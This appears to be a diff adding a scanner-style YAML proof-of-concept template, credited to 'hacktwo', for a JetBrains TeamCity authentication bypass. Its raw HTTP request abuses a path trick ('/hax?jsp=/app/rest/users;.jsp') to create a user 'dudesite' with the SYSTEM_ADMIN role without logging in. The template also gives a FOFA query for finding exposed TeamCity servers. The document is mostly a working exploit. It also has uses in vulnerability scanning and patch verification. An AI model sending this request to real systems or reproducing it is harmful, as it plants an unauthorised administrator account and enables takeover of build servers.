@@ -1,0 +1,60 @@
+id: poc-gg0fc1v6ognrfx5i
+info:
+  name: JetBrains TeamCity 身份验证绕过漏洞1
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gg0fc1v6ognrfx5i'
+  tags: unauth,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gg0fc1v6ognrfx5i
+    fofa: body="Log in to TeamCity"
+http:
+- raw:
+  - 'POST /hax?jsp=/app/rest/users;.jsp HTTP/2
+
+
+    X-Tc-Csrf-Token: 7f39d5a7-949f-4296-b055-8a303c9dcbb7
+
+
+    Content-Type: application/json
+
+
+    Accept: application/json
+
+
+    X-Teamcity-Client: Experimental UI
+
+
+    X-Requested-With: XMLHttpRequest
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+
+
+
+    {"username": "dudesite", "password": "dudesite111", "email": "test111@qq.com", "roles": {"role": [{"roleId": "SYSTEM_ADMIN", "scope": "g"}]}}
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    username
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
